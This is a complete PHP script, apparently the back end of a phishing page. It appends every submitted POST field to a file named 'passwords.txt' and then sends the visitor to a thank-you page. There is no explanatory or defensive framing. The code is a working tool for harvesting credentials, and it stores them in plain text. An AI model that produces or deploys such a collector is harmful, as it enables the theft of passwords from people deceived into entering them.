<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Save data to file
    $fp = fopen('passwords.txt', 'a');
    fwrite($fp, "\n");
    fwrite($fp, implode(" ", $_POST));
    fclose($fp);

    // Redirect to the thank you page
    header("Location: thank_you.html");
    exit();
} else {
    // If accessed without POST request, show a message
    echo "Please submit the form.";
}
?>
